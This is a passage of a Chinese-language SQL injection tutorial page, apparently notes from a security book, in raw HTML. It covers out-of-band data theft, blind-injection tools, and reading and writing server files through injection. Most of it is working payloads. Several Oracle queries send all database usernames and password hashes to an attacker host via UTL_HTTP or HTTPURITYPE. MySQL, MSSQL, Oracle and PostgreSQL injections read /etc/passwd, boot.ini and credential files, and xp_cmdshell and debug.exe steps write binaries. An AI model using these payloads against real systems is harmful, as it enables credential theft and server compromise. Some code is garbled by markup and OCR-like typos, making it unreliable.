punctuation">(</span><span class="token keyword">SELECT</span> sys<span class="token punctuation">.</span>stragg<span class="token punctuation">(</span><span class="token keyword">DISTINCT</span> username<span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token operator">||</span>password<span class="token operator">||</span>chr<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dba_users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span>'a<span class="token comment">-- 将所有用户名和口令发送给了攻击者的访问日志</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Oracle 9z R2和更高版本的+XMLB：</span><span class="token string">'a'</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'attacker.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> xmltransform<span class="token punctuation">(</span>sys_xmlagg<span class="token punctuation">(</span>sys_xmlgen<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;?xml version="l.0"?&gt; &lt;xsl:stylesheet version="1.0" xmlns:xs1="http://www.w3.org/1999/XSL/Transform"&gt;&lt;xsl:template match="/"&gt;&lt;xsl:for-each select="/ROWSET/ USERNAME"&gt;&lt;xsl:value-of select="text()"/&gt;;&lt;/xsl:for-each&gt;&lt;/xsl:templatex/xsl:stylesheet&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstringval<span class="token punctuation">(</span><span class="token punctuation">)</span> listagg <span class="token keyword">from</span> all_users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span>'a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#HTTPURITYPE</span><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>LENGTH<span class="token punctuation">(</span>HTTPURITYPE<span class="token punctuation">(</span><span class="token string">'http://attacker/'</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span>getclob <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">WHERE</span> <span class="token keyword">type</span><span class="token comment">#=0 AND LENGTH(password)=16)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Web服务器的访问日志文件将包含数据库的所有用户名和口令。</p><p>注入ORDER BY子句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> LENGTH<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> dba_users <span class="token keyword">WHERE</span> UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'www.attacker.com/'</span><span class="token operator">||</span>username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password<span class="token punctuation">)</span> <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ICMP渗透"><a href="#ICMP渗透" class="headerlink" title="ICMP渗透"></a>ICMP渗透</h4><h3 id="自动SQL盲注利用"><a href="#自动SQL盲注利用" class="headerlink" title="自动SQL盲注利用"></a>自动SQL盲注利用</h3><h4 id="Absinthe"><a href="#Absinthe" class="headerlink" title="Absinthe"></a>Absinthe</h4><p>Absinthe的威力在于支持数据库映射，并且能利用基于错误和响应的推断利用来对很多流行的数据库（不管是商业的还是开源的）进行检索。方便的GUI为攻击者带来了很好的体验，但缺少特征签名支持限制了其效能。</p><h4 id="BSQL-Hacker"><a href="#BSQL-Hacker" class="headerlink" title="BSQL Hacker"></a>BSQL Hacker</h4><p>BSQL Hacker是另一款图形化工具，它使用基于时间及响应的推断技术和标准错误来从所提问的数据库中提取数据。虽然它仍处于测试阶段，不是很稳定，但该工具前景很好且提供了很多欺诈机会。</p><p><a href="https://labs.portcullis.co.uk/apologies-page-not-found/#aHR0cHM6Ly9sYWJzLnBvcnRjdWxsaXMuY28udWsvYXBwbGljYXRpb24vYnNhbC1oYWNrZXI=">Apologies, page not found | Portcullis Labs</a></p><h4 id="SQLBrute"><a href="#SQLBrute" class="headerlink" title="SQLBrute"></a>SQLBrute</h4><p>SQLBrute是一款命令行工具，它针对希望使用基于时间或响应的推断来利用某个固定漏洞的用户。</p><h4 id="Sqlmap-1"><a href="#Sqlmap-1" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><p>Sqlmap将漏洞的发现和利用结合在一款强大的工具中，它既支持基于时间的推断方法，也支持基于响应的推断方法，另外还支持ICMP通道方法。该工具的成长速度很快，开发也很活跃。</p><h4 id="Sqlninja"><a href="#Sqlninja" class="headerlink" title="Sqlninja"></a>Sqlninja</h4><p>Sqlninja有很多特性，它支持使用基于DNS的非主流通道来执行远程命令。首先上传一个自定义的二进制封装器（wrapper），然后通过上传的封装器来执行命令。封装器捕获所有来自命令的输出并初始化一个DNS请求序列，请求中包含了编码后的输出。</p><h4 id="Squeeza"><a href="#Squeeza" class="headerlink" title="Squeeza"></a>Squeeza</h4><p>Squeeza则从另一个视角审视SQL注入，它将数据创建与数据提取区分开来。该命令行工具可使用基于时间的推断、标准错误或DNS来提取时间。DNS通道完全借助T-SQL来执行，因而不需要上传二进制封装器。</p><h2 id="利用操作系统"><a href="#利用操作系统" class="headerlink" title="利用操作系统"></a>利用操作系统</h2><p>访问文件系统以执行有效的任务（比如读取数据和上传文件）</p><h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h3><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>攻击者希望能够读取ASCII文本和二进制文件。</p><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><p>MySQL提供LOAD DATA INFILE和LOAD_FILE命令将文本文件读到数据库中。</p><p>LOAD DATA INFILE语句以非常快的速度从文本文件中读取一行数据至表中。文件名必须是字符串字面值。</p><p>用法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#先创建一个文本test.txt，格式：</span><span class="token comment">#name school old</span><span class="token comment">#创建一张表来保存读取的信息</span><span class="token keyword">create</span> <span class="token keyword">table</span> test<span class="token punctuation">(</span>name <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>school <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>old <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#读取并填充表</span><span class="token keyword">load</span> <span class="token keyword">data</span> <span class="token keyword">infile</span> <span class="token string">'/xxx/test.txt'</span> <span class="token keyword">into</span> <span class="token keyword">table</span> test <span class="token keyword">fields</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment">#读取成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>LOAD_FILE该函数不创建表可以直接传递结果</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/xxx/test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#注入回显文件的内容</span>dvwa<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>sqli<span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit<span class="token comment">#</span><span class="token comment">#通常etc/passwd换成16进制，以省略单引号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#获取二进制文件</span><span class="token string">'union select NULL,HEX(LOAD_FILE('</span><span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token keyword">temp</span><span class="token punctuation">.</span>ini'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>LOAD_FILE（）还接收UNC（通用命名约定）路径，攻击者可以在其他机器上搜索文件，甚至可以引导MySQL服务器连接到他们自己的机器</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'//172.16.125.2/temp_smb/test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h5><p>攻击者（己经获取系统管理员权限）通常首先借用的是BULK INSERT语句。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test.asp?sname=%</span><span class="token comment">#返回了所有用户，注入点</span><span class="token comment">#确定所运行的权限 sa</span>http:<span class="token comment">//test.asp?sname='union select NULL,NULL,NULL,loginame FROM master..sysprocesses</span><span class="token keyword">WHERE</span> spid <span class="token operator">=</span> @<span class="token variable">@SPID</span><span class="token comment">-- </span><span class="token comment">#执行读取命令</span>http:<span class="token comment">//test.asp?sname='; create table hacked(line varchar(8000)); bulk insert hacked from 'c:\boot.ini';-- </span><span class="token comment">#查看表就会看到已经插入</span>http:<span class="token comment">//test.asp?sname='union select NULL,NULL,NULL,line from hacked-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Squeeza工具，允许攻击者在后台临时表中执行批量插入，然后使用所选的通信机制（DNS、错误消息、时间）来提取信息，最后再在攻击者的机器上重建该文件。</p><p>使用一个针对目标应用程序的squeeza.config文件来提取两个文件——远程服务器的 boot.ini 和二进制的 c:\winnt\system32\net.exe</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>coрy c:<span class="token punctuation">\</span>boot.ini stolen-boot.ini c:<span class="token punctuation">\</span>winnt<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>net.exe stolen-net.exe<span class="token operator">!</span>quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>缺少批量插入方法</p><p>使用(滥用)Scripting.FileSystemObject。</p><p>引入了公共语言运行时(Microsoft Language Runtime，CLR)。它允许开发人员将.NET二进制文件轻而易举地集成到数据库中。</p><p>通过向SQL Server导入程序集时所使用的方法来实现，SQL Server 2005默 认禁用了CLR集成。拥有系统管理员或与之等价的权限，以使用sp configure存储过程重新启用该功能</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">exec</span> sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#使用CREATE ASSEMBLY函数从远程服务器加载任何.NET二进制文件至数据库中</span><span class="token comment">#使用下列注入字符串加载.NET程序集c:\temp\test.exe：</span>sname<span class="token operator">=</span><span class="token string">';create assembly sqb from '</span>c:\<span class="token keyword">temp</span>\test<span class="token punctuation">.</span>exe<span class="token string">' with permission_set =unsafe-- #SQL Server在sys.assembly_files表中存储原始的二进制文件（作为HEX字符串）sname='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>substring<span class="token punctuation">(</span>content<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>assembly_files<span class="token comment">-- </span><span class="token comment">#将二进制文件读取到web页面</span><span class="token keyword">create</span> assembly sqb <span class="token keyword">from</span> <span class="token string">'c:\temp\test.exe'</span><span class="token comment">#添加到原始库</span><span class="token keyword">alter</span> assembly sqb <span class="token keyword">add</span> <span class="token keyword">file</span> <span class="token keyword">from</span> <span class="token string">'c:\windows\system32\net.exe'</span><span class="token keyword">alter</span> assembly sqb <span class="token keyword">add</span> <span class="token keyword">file</span> <span class="token keyword">from</span> <span class="token string">'c:\temp\test.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Oracle-5"><a href="#Oracle-5" class="headerlink" title="Oracle"></a>Oracle</h5><p> utl_file_dir/Oracle 目录、Java、Oracle Text三种接口访问文件</p><p> utl_file_dir/Oracle 目录</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">utl_file<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">8</span> 至 <span class="token number">11</span>g<span class="token punctuation">)</span>DBMS_LOB<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">8</span> 至 <span class="token number">11</span>g<span class="token punctuation">)</span><span class="token comment">#从rds.txt文件读取了1000个字节(从第1个字节开始)，该文件位于MEDIA DIR目录中。</span><span class="token keyword">DECLARE</span>buf varchar2<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BEG <span class="token operator">IN</span>Lob_loc:<span class="token operator">=</span> BFILENAME<span class="token punctuation">(</span><span class="token string">'MEDIA_DIR'</span><span class="token punctuation">,</span><span class="token string">'rds.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">OPEN</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> DBMS_LOB<span class="token punctuation">.</span>LOB_READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">READ</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>utl_raw<span class="token punctuation">.</span>cast_to_varchar2<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">CLOSE</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span>外部表<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">9</span>i R2 至 <span class="token number">11</span>g<span class="token punctuation">)</span><span class="token keyword">create</span> directory ext <span class="token keyword">as</span> <span class="token string">'C:\';CREATE TABLE ext_tab(line varchar2(256))ORGANIZATION EXTERNAL (TYPE oracle_loaderDEFAULT DIRECTORY extACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINEBADFILE '</span>bad_data<span class="token punctuation">.</span>bad<span class="token string">'LOGFILE '</span>log_data<span class="token punctuation">.</span>log<span class="token string">'FIELDS TERMINATED BY '</span><span class="token punctuation">,</span><span class="token string">'MISSING FIELD VALUES ARE NULLREJECT ROWS WITH ALL NULL FIELDS(line))LOCATION ('</span>victim<span class="token punctuation">.</span>txt<span class="token string">'))PARALLELREJECT LIMIT 0NOMONITORING;Select * from ext_tab;'</span>XMLType<span class="token punctuation">(</span>PL<span class="token operator">/</span><span class="token keyword">SQL</span><span class="token punctuation">,</span> Oracle <span class="token number">9</span>i R2 至 <span class="token number">11</span>g<span class="token punctuation">)</span><span class="token comment">#从data-source.xml文件中读取用户名、明文口令和连接字符串</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@user'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'/'</span><span class="token operator">||</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@password'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'@'</span><span class="token operator">||</span>substr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>instr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'//'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> conn <span class="token keyword">FROM</span> <span class="token keyword">table</span><span class="token punctuation">(</span>XMLSequence<span class="token punctuation">(</span>extract<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span>bfilename<span class="token punctuation">(</span><span class="token string">'GETPWDIR'</span><span class="token punctuation">,</span><span class="token string">'datasources.xml'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>nls_charset_id<span class="token punctuation">(</span><span class="token string">'WE8ISO8859P1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/data-sources/connection-pool/connection-factory'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c<span class="token operator">/</span><span class="token comment">#Oracle Text是一种很少有人知道的读取文件和URInate的技术。它不需要Java或utl_file_dir/Oracle目录，只需将想读取的文件或URL插入到一张表中并创建一个全文索引或者一直等待全文索引创建成功即可。该索引了包含整个文件的内容。</span><span class="token comment">#下列示例代码说明了如何通过将boot.ini插入到一张表中来读取该文件</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> files <span class="token punctuation">(</span>id NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>path <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">;</span>ot_format <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> files <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'c:\boot.ini'</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> file_index <span class="token keyword">ON</span> files<span class="token punctuation">(</span>path<span class="token punctuation">)</span> INDEXTYPE <span class="token operator">IS</span> ctxsys<span class="token punctuation">.</span>contextPARAMETERS<span class="token punctuation">(</span><span class="token string">'datastore ctxsys.file_datastore format column ot_format'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- retrieve data from the fulltext index</span><span class="token keyword">Select</span> token_text <span class="token keyword">from</span> dr$file_index$i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="PostgreSQL-3"><a href="#PostgreSQL-3" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>PostgreSQL提供了内置的COPY功能，可以将文本文件复制到表中的text字段，使用COPY 功能复制文件时，该文本文件应该是完全可读的(world readable),或者运行PostgreSQL进程的用户(通常是postgres用户)应该是该文件的所有者。</p><p>下面的例子演示了攻击者如何读取 ‘etc/passwd’文件的内容：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#创建一个临时表</span>http:<span class="token comment">//10.10.10.114/test.php?id=1;CREATE table temp (name text);-- </span><span class="token comment">#将文件复制到表中</span>http:<span class="token comment">//10.10.10.114/test.php?id=1;copy temp from '/etc/passwd'-- </span><span class="token comment">#读取表。在将文件复制到表中之后，就可以使用SQL注入技术来读取该表，比如使用 union技术或盲注技术</span>http:<span class="token comment">//10.10.10.114/test.php?id=l union select 2,name from temp-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><h5 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h5><p>select into outfile（dumpfile）该命令可以将一条select语句的结果写到MySQL进程所有者拥有的完全可读的文件中（dumpfile允许写二进制文件）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'test'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/tmp/test.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#使用下列搜索字符串：</span>aaa <span class="token string">'union select NULL,'</span>SensePost <span class="token number">2008</span>\n<span class="token string">' into dumpfile '</span><span class="token operator">/</span>tmp<span class="token operator">/</span>sp<span class="token punctuation">.</span>txt' <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用的是dumpfile(允许输出二进制文件)而非 outfile，这样一来，要想正常结束一行，就必须提供\n</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UNHEX<span class="token punctuation">(</span><span class="token string">'53656E7365506F7374203038'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#unhex()和hex()相反</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="Mssql-1"><a href="#Mssql-1" class="headerlink" title="Mssql"></a>Mssql</h5><p>读取文件的scripting.filesystem对象方法来有效地向文件系统写文件，也可以使用该技术来写二进制文件，某些代码页面使用该技术的话会出现错误，对于这种情况，可以使用其他对象而非filesystem对象，比如ADODB.Stream。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#批量复制程序BCP</span>C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>bcp <span class="token string">"select name from sysobjects"</span> queryout testout<span class="token punctuation">.</span>txt <span class="token operator">-</span>c <span class="token operator">-</span>S <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">-</span>U sa <span class="token operator">-</span>P<span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#使用重定向运算符&gt;&gt;创建文本文件：</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo Thisis a test &gt;c:\temp\test.txt'</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo Thisis line2 &gt;&gt;c:\temp\test.txt'</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">'echo Thisis line3&gt;&gt;c:\temp\test.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#先创建一个debug.exe脚本文件，然后将它传递给debug.exe以转换成一个二进制文件。</span>C:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>debug <span class="token operator">&lt;</span> demo<span class="token punctuation">.</span>scr<span class="token operator">-</span>n demo<span class="token punctuation">.</span>com<span class="token operator">-</span>e <span class="token number">0000</span> <span class="token number">4</span>D <span class="token number">5</span>A <span class="token number">90</span> <span class="token number">00</span> <span class="token number">03</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">04</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> FF FF <span class="token number">00</span> <span class="token number">00</span><span class="token operator">-</span>e <span class="token number">0010</span> B8 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">40</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> o0 o0 <span class="token number">00</span><span class="token operator">-</span>е <span class="token number">0040</span> <span class="token number">0</span>E <span class="token number">1</span>F BA OE <span class="token number">00</span> B4 <span class="token number">09</span> CD <span class="token number">21</span> B8 <span class="token number">01</span> <span class="token number">4</span>C CD <span class="token number">21</span> <span class="token number">54</span> <span class="token number">68</span><span class="token operator">-</span>е <span class="token number">0050</span> <span class="token number">69</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">70</span> <span class="token number">72</span> <span class="token number">6</span>F <span class="token number">67</span> <span class="token number">72</span> <span class="token number">61</span> <span class="token number">6</span>D <span class="token number">20</span> <span class="token number">63</span> <span class="token number">61</span> <span class="token number">6</span>E <span class="token number">6</span>E <span class="token number">6</span>F<span class="token operator">-</span>е <span class="token number">0060</span> <span class="token number">74</span> <span class="token number">20</span> <span class="token number">62</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">72</span> <span class="token number">75</span> <span class="token number">6</span>E <span class="token number">20</span> <span class="token number">69</span> <span class="token number">6</span>E <span class="token number">20</span> <span class="token number">44</span> <span class="token number">4</span>F <span class="token number">53</span> <span class="token number">20</span><span class="token operator">-</span>e <span class="token number">0070</span> <span class="token number">6</span>D <span class="token number">6</span>F <span class="token number">64</span> <span class="token number">65</span> <span class="token number">2</span>E OD OD <span class="token number">0</span>A <span class="token number">24</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>rexCX <span class="token number">0000</span>:<span class="token number">4200</span><span class="token operator">-</span>w <span class="token number">0</span>Writing <span class="token number">04200</span> bytes<span class="token operator">-</span>qC:\<span class="token keyword">temp</span><span class="token operator">&gt;</span>dir demo<span class="token operator">*</span><span class="token number">2008</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">/</span><span class="token number">27</span> <span class="token number">03</span>:<span class="token number">18</span>p<span class="token number">16</span><span class="token punctuation">,</span><span class="token number">896</span> demo<span class="token punctuation">.</span>com<span class="token number">2005</span><span class="token operator">/</span><span class="token number">11</span><span class="token operator">/</span><span class="token number">21</span> <span class="token number">11</span>:<span class="token number">08</span>a<span class="token number">61</span>r280 demo<span class="token punctuation">.</span>scrcopy <span class="token operator">/</span>b chunk<span class="token operator">-</span><span class="token number">1.</span>exe_ <span class="token operator">+</span> chunk<span class="token operator">-</span><span class="token number">2.</span>exe_ <span class="token operator">+</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">+</span> chunk<span class="token operator">-</span>n<span class="token punctuation">.</span>exe original<span class="token operator">-</span><span class="token keyword">file</span><span class="token punctuation">.</span>exe <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Oracle-6"><a href="#Oracle-6" class="headerlink" 